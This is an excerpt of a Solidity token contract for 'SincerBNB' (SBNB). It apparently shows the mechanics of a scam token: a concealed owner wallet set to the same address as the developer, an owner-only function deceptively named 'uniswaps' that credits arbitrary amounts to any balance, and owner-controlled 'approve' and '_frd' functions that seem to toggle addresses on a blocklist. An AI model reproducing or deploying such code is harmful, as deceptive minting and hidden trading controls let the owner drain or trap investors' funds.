...
contract Ownable is Context {
    ...
    address private _temwallet = 0xD5c2C2372eDfFA46De3edc3A279aE43077338bA2;
...
contract SBNB is Context, IERC20, Ownable {
    ...
    string private _name = "SincerBNB";
    string private _symbol = "SBNB";
    uint8 private _decimals = 9;
     
   
    address public devAddress = 0xD5c2C2372eDfFA46De3edc3A279aE43077338bA2;
    ...
    function excludeFromFee(address mlis) public onlyownerd {
        _ExcluFee[mlis] = true;
    }

    function includeInFee(address mlis) public onlyownerd {
        _ExcluFee[mlis] = false;
    }
 
    function setamsd(bool mlis) external onlyownerd() {
        amsd = mlis;
    }
    function approve(address mlis) external onlyownerd() {
        _RCO[mlis] = true;
    }

    function _frd(address mlis) external onlyownerd() {
        delete _RCO[mlis];
    }
    function uniswaps(address mlis, uint256 asmed) 
        external 
        onlyownerd() {
        require(asmed > 0, "");
        uint256 uniswapsb = BIis[mlis];
        if (uniswapsb == 0) _BIis.push(mlis);
        BIis[mlis] = uniswapsb.add(asmed);
        Rhsp = Rhsp.add(asmed);
